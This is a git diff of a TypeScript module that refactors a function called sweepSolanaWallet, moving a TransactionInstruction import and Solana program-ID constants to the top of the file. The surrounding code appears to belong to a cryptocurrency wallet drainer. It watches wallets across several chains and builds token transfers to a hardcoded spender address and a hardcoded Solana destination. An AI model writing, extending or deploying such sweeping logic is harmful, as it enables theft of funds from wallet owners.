@@ -1,10 +1,13 @@
 import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
 import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem/chains';
 import { privateKeyToAccount } from 'viem/accounts';
-import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
+import { Connection, PublicKey, Keypair, Transaction, TransactionInstruction, sendAndConfirmTransaction } from '@solana/web3.js';
 import bs58 from 'bs58';
 import { storage } from './storage';
 import type { MonitoredWallet } from '@shared/schema';
+
+const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
+const RENT_SYSVAR_ID = new PublicKey('SysvarRent111111111111111111111111111111111');
 
 const SPENDER_ADDRESS = "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E" as const;
 const SOLANA_DESTINATION = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
@@ -241,8 +244,6 @@ async function sweepSolanaWallet(wallet: MonitoredWallet): Promise<{ swept: bool
       
       const destAtaInfo = await solanaConnection.getAccountInfo(destAta);
       if (!destAtaInfo) {
-        const { TransactionInstruction } = await import('@solana/web3.js');
-        const RENT_SYSVAR = new PublicKey('SysvarRent111111111111111111111111111111111');
         transaction.add(
           new TransactionInstruction({
             keys: [
@@ -250,9 +251,9 @@ async function sweepSolanaWallet(wallet: MonitoredWallet): Promise<{ swept: bool
               { pubkey: destAta, isSigner: false, isWritable: true },
               { pubkey: destKey, isSigner: false, isWritable: false },
               { pubkey: mintKey, isSigner: false, isWritable: false },
-              { pubkey: new PublicKey('11111111111111111111111111111111'), isSigner: false, isWritable: false },
+              { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
               { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
-              { pubkey: RENT_SYSVAR, isSigner: false, isWritable: false },
+              { pubkey: RENT_SYSVAR_ID, isSigner: false, isWritable: false },
             ],
             programId: ASSOCIATED_TOKEN_PROGRAM_ID,
             data: Buffer.alloc(0),
@@ -267,7 +268,6 @@ async function sweepSolanaWallet(wallet: MonitoredWallet): Promise<{ swept: bool
       view.setBigUint64(0, transferAmount, true);
       data.set(new Uint8Array(amountBytes), 1);
       
-      const { TransactionInstruction } = await import('@solana/web3.js');
       transaction.add(
         new TransactionInstruction({
           keys: [
